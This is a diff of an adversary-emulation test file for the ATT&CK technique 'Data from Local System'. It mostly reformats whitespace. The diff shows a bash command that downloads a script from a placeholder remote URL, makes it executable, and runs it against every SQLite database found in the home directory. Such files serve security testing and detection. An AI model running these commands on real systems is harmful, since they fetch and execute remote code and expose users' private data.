@@ -1,7 +1,7 @@
 attack_technique: T1005
 display_name: Data from Local System
 atomic_tests:
-- name: Search files of interest and save them to a single zip file (Windows)                                  
+- name: Search files of interest and save them to a single zip file (Windows)
   auto_generated_guid: d3d9af44-b8ad-4375-8b0a-4bff4b7e419c
   description: |
     This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              
@@ -78,13 +78,13 @@ atomic_tests:
     name: bash
     elevation_required: false
     command: |
-        cd $HOME
-        curl -O #{remote_url}/art
-        curl -O #{remote_url}/gta.db
-        curl -O #{remote_url}/sqlite_dump.sh
-        chmod +x sqlite_dump.sh
-        find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
-    cleanup_command: |
-        rm -f $HOME/.art
-        rm -f $HOME/gta.db
-        rm -f $HOME/sqlite_dump.sh 
+      cd $HOME
+      curl -O #{remote_url}/art
+      curl -O #{remote_url}/gta.db
+      curl -O #{remote_url}/sqlite_dump.sh
+      chmod +x sqlite_dump.sh
+      find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+    cleanup_command: |-
+      rm -f $HOME/.art
+      rm -f $HOME/gta.db
+      rm -f $HOME/sqlite_dump.sh
